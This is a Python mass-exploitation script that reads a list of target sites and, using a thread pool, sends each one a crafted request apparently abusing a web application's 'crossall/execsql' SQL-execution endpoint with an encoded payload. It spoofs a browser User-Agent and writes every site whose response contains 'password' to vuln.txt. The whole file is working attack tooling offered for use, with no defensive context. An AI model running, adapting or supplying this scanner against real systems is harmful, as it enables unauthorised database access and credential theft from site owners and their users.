import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import re
import random




urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list = []




def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")


def check_url(url):
    url = parse.urlparse(url)
    url = '{}://{}'.format(url[0], url[1])
    url = url + "/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5"
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62",
    }
    try:
        res = requests.get(url, verify=False, allow_redirects=False, headers=headers, timeout=5)
        if res.status_code == 200 and 'password' in res.text:
            # rr=re.compile(r"Content-Length': '(.*?)'", re.I)
            print("\033[32m[+]{}\033[0m".format(url))
            wirte_targets(url, "vuln.txt")
        else:
            pass
        # print("\033[32m[+]%s   %d \033[0m" %(url,res.status_code))
        # rr=re.compile(r'Length(.*?)Date')
    except Exception as e:
        pass


def multithreading(url_list, pools=5):
    works = []
    for i in url_list:
        # works.append((func_params, None))
        works.append(i)
    # print(works)
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(check_url, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()


if __name__ == '__main__':
    arg = ArgumentParser(description='check_url By m2')
    arg.add_argument("-u",
                     "--url",
                     help="Target URL; Example:http://ip:port")
    arg.add_argument("-f",
                     "--file",
                     help="Target URL; Example:url.txt")
    args = arg.parse_args()
    url = args.url
    filename = args.file
    print("[+]任务开始.....")
    start = time()
    if url != None and filename == None:
        check_url(url)
    elif url == None and filename != None:
        for i in open(filename):
            i = i.replace('\n', '')
            url_list.append(i)
        multithreading(url_list, 10)
    end = time()
    print('任务完成,用时%ds.' % (end - start))
